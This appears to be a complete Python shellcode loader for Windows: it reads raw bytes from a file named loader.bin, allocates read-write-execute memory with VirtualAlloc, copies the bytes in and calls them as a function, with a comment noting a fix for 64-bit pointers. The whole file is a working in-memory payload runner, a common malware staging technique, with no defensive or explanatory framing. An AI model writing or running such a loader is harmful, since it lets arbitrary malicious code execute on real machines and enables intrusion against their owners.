import ctypes

# Load shellcode
with open("loader.bin", "rb") as f:
    shellcode = f.read()

size = len(shellcode)
kernel32 = ctypes.windll.kernel32

# Fix: Set return type to 64-bit pointer
kernel32.VirtualAlloc.restype = ctypes.c_void_p

# Allocate memory
ptr = kernel32.VirtualAlloc(
    None,
    size,
    0x3000,  # MEM_COMMIT | MEM_RESERVE
    0x40     # PAGE_EXECUTE_READWRITE
)

if not ptr:
    raise ctypes.WinError()

# Write shellcode
ctypes.memmove(ptr, shellcode, size)

# Cast to function and execute
shell_func = ctypes.CFUNCTYPE(None)(ptr)
shell_func()
